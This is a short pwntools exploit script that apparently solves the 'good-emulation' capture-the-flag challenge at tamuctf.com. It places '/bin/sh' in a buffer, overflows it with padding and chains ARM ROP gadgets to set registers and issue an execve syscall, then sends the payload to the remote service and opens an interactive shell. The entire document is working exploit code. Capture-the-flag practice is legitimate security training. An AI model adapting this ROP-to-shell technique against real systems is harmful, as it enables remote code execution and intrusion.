from pwn import *

pop_r0_pc = p32(0x60830)
pop_r1_pc = p32(0x60918)
mov_ip_svc = p32(0x4ec5c) # mov ip, #0 ; svc #0 ; (1 found)
pop_r7_pc = p32(0x2ea68)

binsh = b'/bin/sh\x00' 
padding = (128 - len(binsh)) * b'A'
rbp = b'B' * 4

payload = binsh + padding + rbp + pop_r1_pc + p32(0x0) + pop_r0_pc + p32(0x40800c08) + pop_r7_pc + p32(0xb) + mov_ip_svc

context.log_level = "debug"
r = remote("tamuctf.com", 443, ssl=True, sni="good-emulation")
r.recvuntil(b"buf is at")
r.recvline()
r.send(payload)
r.interactive()
